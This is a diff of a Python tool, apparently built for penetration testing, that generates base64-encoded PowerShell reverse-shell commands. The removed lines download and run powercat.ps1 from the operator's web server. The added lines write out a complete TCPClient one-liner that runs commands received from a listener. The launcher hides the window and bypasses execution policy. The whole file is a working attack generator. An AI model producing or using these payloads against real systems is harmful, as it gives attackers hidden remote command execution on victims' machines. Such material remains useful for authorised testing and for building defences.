@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 
 """
-Script to generate a base64-encoded powershell payload that tells the victim
-to download powercat.ps1 from your webserver and invoke it to your listener.
+Script to generate a base64-encoded powershell payload of a one-liner reverse shell.
 """
 
 import argparse
@@ -14,11 +13,9 @@ import sys
 from ipaddress import ip_address
 
 LPORT = 443
-HTTP_PORT = 80
 
 payload_template = """\
-IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}{hport}/powercat.ps1');\
-powercat -c {lhost} -p {lport} -e powershell
+$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
 """
 caller_template = "powershell -nop -noni -ep bypass -w hidden -e {payload}"
 
@@ -44,15 +41,13 @@ def portnum(p):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-                    prog='mkpowercat',
-                    description='Creates a base64-encoded powershell command to download powercat.ps1 from an attacker and execute it for a reverse shell back to the attacker. Automatically handles conversion to Windows UTF-16LE string encoding.')
+                    prog='mkpsrev',
+                    description='Creates a base64-encoded powershell one-liner reverse shell.')
     parser.add_argument('-i', '--lhost', type=ip_address, default=get_ip_address("tun0"), help="LHOST, IP address for reverse shell listener.")
     parser.add_argument('-p', '--lport', type=portnum, default=LPORT, help="LPORT for reverse shell listener.")
-    parser.add_argument('-P','--http-port', type=portnum, default=HTTP_PORT, help="HTTP server's listening port.")
     args = parser.parse_args()
 
-    hport = "" if args.http_port == 80 else f":{args.http_port}"
-    payload = payload_template.format(lhost=args.lhost,lport=args.lport,hport=hport)
+    payload = payload_template.format(lhost=args.lhost,lport=args.lport)
     print("[*] base64-encoded payload:", file=sys.stderr)
     print(f"[*] {payload}", file=sys.stderr)
     payload = base64.b64encode(payload.encode("utf-16le")).decode()
